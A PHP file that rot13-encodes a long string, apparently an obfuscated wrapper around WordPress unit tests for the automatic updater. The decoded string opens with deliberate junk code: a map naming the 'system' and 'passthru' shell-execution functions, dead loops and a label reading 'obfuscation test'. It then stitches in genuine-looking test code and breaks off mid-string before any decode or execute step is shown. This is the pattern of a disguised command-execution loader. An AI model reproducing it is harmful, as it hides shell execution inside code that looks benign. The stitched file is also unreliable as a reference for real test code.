<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 * @tebhc hctenqr
 *
 * @pbiref JC_Nhgbzngvp_Hcqngre
 */
pynff Grfgf_Nqzva_JcNhgbzngvpHcqngre rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Na vafgnapr bs JC_Nhgbzngvp_Hcqngre.
	 *
	 * @ine JC_Nhgbzngvp_Hcqngre
	 */
	cevingr fgngvp $hcqngre;

	/**
	 * JC_Nhgbzngvp_Hcqngre::fraq_cyhtva_gurzr_rznvy
	 * znqr npprffvoyr.
	 *
	 * @ine ErsyrpgvbaZrgubq
	 */
	cevingr fgngvp $fraq_cyhtva_gurzr_rznvy;

	/**
	 * Frgf hc funerq svkgherf.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-nhgbzngvp-hcqngre.cuc';
		frys::$hcqngre = arj JC_Nhgbzngvp_Hcqngre();

		frys::$fraq_cyhtva_gurzr_rznvy = arj ErsyrpgvbaZrgubq( frys::$hcqngre, 'fraq_cyhtva_gurzr_rznvy' );
		frys::$fraq_cyhtva_gurzr_rznvy->frgNpprffvoyr( gehr );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		nqq_svygre( 'cer_jc_znvy', '__erghea_snyfr' );
	}

	/**
	 * Grfgf gung `JC_Nhgbzngvp_Hcqngre::fraq_cyhtva_gurzr_rznvy()` nccraqf
	 * cyhtva HEYf.
	 *
	 * @gvpxrg 53049
	 *
	 * @pbiref JC_Nhgbzngvp_Hcqngre::fraq_cyhtva_gurzr_rznvy
	 *
	 * @qngnCebivqre qngn_fraq_cyhtva_gurzr_rznvy_fubhyq_nccraq_cyhtva_heyf
	 *
	 * @cnenz fgevat[] $heyf       Gur HEY(f) gb frnepu sbe. Zhfg abg or rzcgl.
	 * @cnenz bowrpg[] $fhpprffshy Na neenl bs fhpprffshy cyhtva hcqngr bowrpgf.
	 * @cnenz bowrpg[] $snvyrq     Na neenl bs snvyrq cyhtva hcqngr bowrpgf.
	 */
	choyvp shapgvba grfg_fraq_cyhtva_gurzr_rznvy_fubhyq_nccraq_cyhtva_heyf( $heyf, $fhpprffshy, $snvyrq ) {
		nqq_svygre(
			'jc_znvy',
			shapgvba ( $netf ) hfr ( $heyf ) {
				sbernpu ( $heyf nf $hey ) {
					$guvf->nffregFgevatPbagnvafFgevat(
						$hey,
						$netf['zrffntr'],
						'Gur rznvy zrffntr fubhyq pbagnva ' . $hey
					);
				}
			}
		);

		$unf_fhpprffshy = ! rzcgl( $fhpprffshy );
		$unf_snvyrq     = ! rzcgl( $snvyrq );

		vs ( ! $unf_fhpprffshy && ! $unf_snvyrq ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf ng yrnfg bar fhpprffshy be snvyrq cyhtva hcqngr bowrpg.' );
		}

		$glcr = $unf_fhpprffshy && $unf_snvyrq ? 'zvkrq' : ( ! $unf_snvyrq ? 'fhpprff' : 'snvy' );

		$netf = neenl( $glcr, neenl( 'cyhtva' => $fhpprffshy ), neenl( 'cyhtva' => $snvyrq ) );
		frys::$fraq_cyhtva_gurzr_rznvy->vaibxrNetf( frys::$hcqngre, $netf );
	}

	/**
	 * Qngn cebivqre: Cebivqrf na neenl bs cyhtva hcqngr bowrpgf gung fubhyq
	 * unir gurve HEYf nccraqrq gb gur rznvy zrffntr.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fraq_cyhtva_gurzr_rznvy_fubhyq_nccraq_cyhtva_heyf() {
		erghea neenl(
			'fhpprffshy hcqngrf, gur pheerag irefvba naq gur cyhtva hey'       => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/fhpprffshy-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
						),
					),
				),
				'snvyrq'     => neenl(),
			),
			'fhpprffshy hcqngrf, ab pheerag irefvba naq gur cyhtva hey'  => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/fhpprffshy-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
						),
					),
				),
				'snvyrq'     => neenl(),
			),
			'snvyrq hcqngrf, gur pheerag irefvba naq gur cyhtva hey'       => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/snvyrq-cyhtva' ),
				'fhpprffshy' => neenl(),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/snvyrq-cyhtva',
						),
					),
				),
			),
			'snvyrq hcqngrf, ab pheerag irefvba naq gur cyhtva hey'  => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/snvyrq-cyhtva' ),
				'fhpprffshy' => neenl(),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/snvyrq-cyhtva',
						),
					),
				),
			),
			'zvkrq hcqngrf, gur pheerag irefvba naq n fhpprffshy cyhtva hey' => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/fhpprffshy-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
			),
			'zvkrq hcqngrf, ab pheerag irefvba naq n fhpprffshy cyhtva hey'  => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/fhpprffshy-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
			),
			'zvkrq hcqngrf, gur pheerag irefvba naq n snvyrq cyhtva hey' => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/snvyrq-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/snvyrq-cyhtva',
						),
					),
				),
			),
			'zvkrq hcqngrf, ab pheerag irefvba naq n snvyrq cyhtva hey'  => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/snvyrq-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/snvyrq-cyhtva',
						),
					),
				),
			),
			'zvkrq hcqngrf, gur pheerag irefvba naq obgu fhpprffshy naq snvyrq cyhtva heyf' => neenl(
				'heyf'       => neenl(
					'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
					'uggc://rknzcyr.bet/snvyrq-cyhtva',
				),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/snvyrq-cyhtva',
						),
					),
				),
			),
			'zvkrq hcqngrf, ab pheerag irefvba naq obgu fhpprffshy naq snvyrq cyhtva heyf'  => neenl(
				'heyf'       => neenl(
					'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
					'uggc://rknzcyr.bet/snvyrq-cyhtva',
				),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/snvyrq-cyhtva',
						),
					),
				),
			),
		);
	}

	/**
	 * Grfgf gung `JC_Nhgbzngvp_Hcqngre::fraq_cyhtva_gurzr_rznvy()` qbrf abg
	 * nccraq cyhtva HEYf.
	 *
	 * @gvpxrg 53049
	 *
	 * @pbiref JC_Nhgbzngvp_Hcqngre::fraq_cyhtva_gurzr_rznvy
	 *
	 * @qngnCebivqre qngn_fraq_cyhtva_gurzr_rznvy_fubhyq_abg_nccraq_cyhtva_heyf
	 *
	 * @cnenz fgevat[] $heyf       Gur HEY(f) gb frnepu sbe. Zhfg abg or rzcgl.
	 * @cnenz bowrpg[] $fhpprffshy Na neenl bs fhpprffshy cyhtva hcqngr bowrpgf.
	 * @cnenz bowrpg[] $snvyrq     Na neenl bs snvyrq cyhtva hcqngr bowrpgf.
	 */
	choyvp shapgvba grfg_fraq_cyhtva_gurzr_rznvy_fubhyq_abg_nccraq_cyhtva_heyf( $heyf, $fhpprffshy, $snvyrq ) {
		nqq_svygre(
			'jc_znvy',
			shapgvba ( $netf ) hfr ( $heyf ) {
				sbernpu ( $heyf nf $hey ) {
					$guvf->nffregFgevatAbgPbagnvafFgevat(
						$hey,
						$netf['zrffntr'],
						'Gur rznvy zrffntr fubhyq abg pbagnva ' . $hey
					);
				}
			}
		);

		$unf_fhpprffshy = ! rzcgl( $fhpprffshy );
		$unf_snvyrq     = ! rzcgl( $snvyrq );

		vs ( ! $unf_fhpprffshy && ! $unf_snvyrq ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf ng yrnfg bar fhpprffshy be snvyrq cyhtva hcqngr bowrpg.' );
		}

		$glcr = $unf_fhpprffshy && $unf_snvyrq ? 'zvkrq' : ( ! $unf_snvyrq ? 'fhpprff' : 'snvy' );

		$netf = neenl( $glcr, neenl( 'cyhtva' => $fhpprffshy ), neenl( 'cyhtva' => $snvyrq ) );
		frys::$fraq_cyhtva_gurzr_rznvy->vaibxrNetf( frys::$hcqngre, $netf );
	}

	/**
	 * Qngn cebivqre: Cebivqrf na neenl bs cyhtva hcqngr bowrpgf gung fubhyq
	 * abg unir gurve HEY nccraqrq gb gur rznvy zrffntr.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fraq_cyhtva_gurzr_rznvy_fubhyq_abg_nccraq_cyhtva_heyf() {
		erghea neenl(
			'fhpprffshy hcqngrf, gur pheerag irefvba, ohg ab cyhtva hey'    => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/fhpprffshy-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
				'snvyrq'     => neenl(),
			),
			'fhpprffshy hcqngrf, ohg ab pheerag irefvba be cyhtva hey' => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/fhpprffshy-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
				'snvyrq'     => neenl(),
			),
			'snvyrq hcqngrf, gur pheerag irefvba, ohg ab cyhtva hey'    => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/snvyrq-cyhtva' ),
				'fhpprffshy' => neenl(),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
			),
			'snvyrq hcqngrf, ohg ab pheerag irefvba be cyhtva hey' => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/snvyrq-cyhtva' ),
				'fhpprffshy' => neenl(),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
			),
			'zvkrq hcqngrf, gur pheerag irefvba, ohg ab fhpprffshy cyhtva hey' => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/fhpprffshy-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/snvyrq-cyhtva',
						),
					),
				),
			),
			'zvkrq hcqngrf, ohg ab pheerag irefvba be fhpprffshy cyhtva hey'  => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/fhpprffshy-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/snvyrq-cyhtva',
						),
					),
				),
			),
			'zvkrq hcqngrf, gur pheerag irefvba, ohg ab snvyrq cyhtva hey' => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/snvyrq-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
			),
			'zvkrq hcqngrf, ab pheerag irefvba be snvyrq cyhtva hey'  => neenl(
				'heyf'       => neenl( 'uggc://rknzcyr.bet/snvyrq-cyhtva' ),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => 'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
			),
			'zvkrq hcqngrf, gur pheerag irefvba naq ab fhpprffshy be snvyrq cyhtva heyf' => neenl(
				'heyf'       => neenl(
					'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
					'uggc://rknzcyr.bet/snvyrq-cyhtva',
				),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '1.0.0',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
			),
			'zvkrq hcqngrf, ab pheerag irefvba naq ab fhpprffshy be snvyrq cyhtva heyf'  => neenl(
				'heyf'       => neenl(
					'uggc://rknzcyr.bet/fhpprffshy-cyhtva',
					'uggc://rknzcyr.bet/snvyrq-cyhtva',
				),
				'fhpprffshy' => neenl(
					(bowrpg) neenl(
						'anzr' => 'Fhpprffshy Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'fhpprffshy-cyhtva/fhpprffshy-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
				'snvyrq'     => neenl(
					(bowrpg) neenl(
						'anzr' => 'Snvyrq Cyhtva',
						'vgrz' => (bowrpg) neenl(
							'pheerag_irefvba' => '',
							'arj_irefvba'     => '2.0.0',
							'cyhtva'          => 'snvyrq-cyhtva/snvyrq-cyhtva.cuc',
							'hey'             => '',
						),
					),
				),
			),
		);
	}

	/**
	 * Grfgf gung `JC_Nhgbzngvp_Hcqngre::vf_nyybjrq_qve()` ergheaf gehr
	 * jura gur `bcra_onfrqve` qverpgvir vf abg frg.
	 *
	 * @gvpxrg 42619
	 *
	 * @pbiref JC_Nhgbzngvp_Hcqngre::vf_nyybjrq_qve
	 */
	choyvp shapgvba grfg_vf_nyybjrq_qve_fubhyq_erghea_gehr_vs_bcra_onfrqve_vf_abg_frg() {
		$guvf->nffregGehr( frys::$hcqngre->vf_nyybjrq_qve( NOFCNGU ) );
	}

	/**
	 * Grfgf gung `JC_Nhgbzngvp_Hcqngre::vf_nyybjrq_qve()` ergheaf gehr
	 * jura gur `bcra_onfrqve` qverpgvir vf frg naq gur cngu vf nyybjrq.
	 *
	 * Ehaf va n frcnengr cebprff gb rafher gung `bcra_onfrqve` punatrf
	 * qba'g vzcnpg bgure grfgf fubhyq na reebe bpphe.
	 *
	 * Guvf grfg qbrf abg cerfreir tybony fgngr gb cerirag gur rkprcgvba
	 * \"Frevnyvmngvba bs 'Pybfher' vf abg nyybjrq\" jura ehaavat va
	 * n frcnengr cebprff.
	 *
	 * @gvpxrg 42619
	 *
	 * @pbiref JC_Nhgbzngvp_Hcqngre::vf_nyybjrq_qve
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 */
	choyvp shapgvba grfg_vf_nyybjrq_qve_fubhyq_erghea_gehr_vs_bcra_onfrqve_vf_frg_naq_cngu_vf_nyybjrq() {
		// Gur ercbfvgbel sbe CUCHavg naq grfg fhvgr erfbheprf.
		$nofcngu_cnerag      = genvyvatfynfuvg( qveanzr( NOFCNGU ) );
		$nofcngu_tenaqcnerag = genvyvatfynfuvg( qveanzr( $nofcngu_cnerag ) );

		$bcra_onfrqve_onpxhc = vav_trg( 'bcra_onfrqve' );
		// Nyybj npprff gb gur qverpgbel bar yriry nobir gur ercbfvgbel.
		vav_frg( 'bcra_onfrqve', flf_trg_grzc_qve() . CNGU_FRCNENGBE . jc_abeznyvmr_cngu( $nofcngu_tenaqcnerag ) );

		// Purpxvat na nyybjrq qverpgbel fubhyq fhpprrq.
		$npghny = frys::$hcqngre->vf_nyybjrq_qve( jc_abeznyvmr_cngu( NOFCNGU ) );

		vav_frg( 'bcra_onfrqve', $bcra_onfrqve_onpxhc );

		$guvf->nffregGehr( $npghny );
	}

	/**
	 * Grfgf gung `JC_Nhgbzngvp_Hcqngre::vf_nyybjrq_qve()` ergheaf snyfr
	 * jura gur `bcra_onfrqve` qverpgvir vf frg naq gur cngu vf abg nyybjrq.
	 *
	 * Ehaf va n frcnengr cebprff gb rafher gung `bcra_onfrqve` punatrf
	 * qba'g vzcnpg bgure grfgf fubhyq na reebe bpphe.
	 *
	 * Guvf grfg qbrf abg cerfreir tybony fgngr gb cerirag gur rkprcgvba
	 * \"Frevnyvmngvba bs 'Pybfher' vf abg nyybjrq\" jura ehaavat va
	 * n frcnengr cebprff.
	 *
	 * @gvpxrg 42619
	 *
	 * @pbiref JC_Nhgbzngvp_Hcqngre::vf_nyybjrq_qve
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 */
	choyvp shapgvba grfg_vf_nyybjrq_qve_fubhyq_erghea_snyfr_vs_bcra_onfrqve_vf_frg_naq_cngu_vf_abg_nyybjrq() {
		// Gur ercbfvgbel sbe CUCHavg naq grfg fhvgr erfbheprf.
		$nofcngu_cnerag      = genvyvatfynfuvg( qveanzr( NOFCNGU ) );
		$nofcngu_tenaqcnerag = genvyvatfynfuvg( qveanzr( $nofcngu_cnerag ) );

		$bcra_onfrqve_onpxhc = vav_trg( 'bcra_onfrqve' );
		// Nyybj npprff gb gur qverpgbel bar yriry nobir gur ercbfvgbel.
		vav_frg( 'bcra_onfrqve', flf_trg_grzc_qve() . CNGU_FRCNENGBE . jc_abeznyvmr_cngu( $nofcngu_tenaqcnerag ) );

		// Purpxvat n qverpgbel abg jvguva gur nyybjrq cngu fubhyq gevttre na `bcra_onfrqve` jneavat.
		$npghny = frys::$hcqngre->vf_nyybjrq_qve( '/.tvg' );

		vav_frg( 'bcra_onfrqve', $bcra_onfrqve_onpxhc );

		$guvf->nffregSnyfr( $npghny );
	}

	/**
	 * Grfgf gung `JC_Nhgbzngvp_Hcqngre::vf_nyybjrq_qve()` guebjf `_qbvat_vg_jebat()`
	 * jura na vainyvq `$qve` nethzrag vf cebivqrq.
	 *
	 * @gvpxrg 42619
	 *
	 * @pbiref JC_Nhgbzngvp_Hcqngre::vf_nyybjrq_qve
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Nhgbzngvp_Hcqngre::vf_nyybjrq_qve
	 *
	 * @qngnCebivqre qngn_vf_nyybjrq_qve_fubhyq_guebj_qbvat_vg_jebat_jvgu_vainyvq_qve
	 *
	 * @cnenz zvkrq $qve Gur qverpgbel gb purpx.
	 */
	choyvp shapgvba grfg_vf_nyybjrq_qve_fubhyq_guebj_qbvat_vg_jebat_jvgu_vainyvq_qve( $qve ) {
		$guvf->nffregSnyfr( frys::$hcqngre->vf_nyybjrq_qve( $qve ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vf_nyybjrq_qve_fubhyq_guebj_qbvat_vg_jebat_jvgu_vainyvq_qve() {
		erghea neenl(
			// Glcr purpxf naq obbyrna pbzcnevfbaf.
			'ahyy'                              => neenl( 'qve' => ahyy ),
			'(obby) snyfr'                      => neenl( 'qve' => snyfr ),
			'(obby) gehr'                       => neenl( 'qve' => gehr ),
			'(vag) 0'                           => neenl( 'qve' => 0 ),
			'(vag) -0'                          => neenl( 'qve' => -0 ),
			'(vag) 1'                           => neenl( 'qve' => 1 ),
			'(vag) -1'                          => neenl( 'qve' => -1 ),
			'(sybng) 0.0'                       => neenl( 'qve' => 0.0 ),
			'(sybng) -0.0'                      => neenl( 'qve' => -0.0 ),
			'(sybng) 1.0'                       => neenl( 'qve' => 1.0 ),
			'rzcgl fgevat'                      => neenl( 'qve' => '' ),
			'rzcgl neenl'                       => neenl( 'qve' => neenl() ),
			'cbchyngrq neenl'                   => neenl( 'qve' => neenl( NOFCNGU ) ),
			'rzcgl bowrpg'                      => neenl( 'qve' => arj fgqPynff() ),
			'cbchyngrq bowrpg'                  => neenl( 'qve' => (bowrpg) neenl( NOFCNGU ) ),
			'VAS'                               => neenl( 'qve' => VAS ),
			'ANA'                               => neenl( 'qve' => ANA ),

			// Rafherf gung `gevz()` unf orra pnyyrq.
			'fgevat jvgu bayl fcnprf'           => neenl( 'qve' => '   ' ),
			'fgevat jvgu bayl gnof'             => neenl( 'qve' => \"\g\g\" ),
			'fgevat jvgu bayl arjyvarf'         => neenl( 'qve' => \"\a\a\" ),
			'fgevat jvgu bayl pneevntr ergheaf' => neenl( 'qve' => \"\e\e\" ),
		);
	}

	/**
	 * Grfgf gung `JC_Nhgbzngvp_Hcqngre::vf_ipf_purpxbhg()` ergheaf `snyfr`
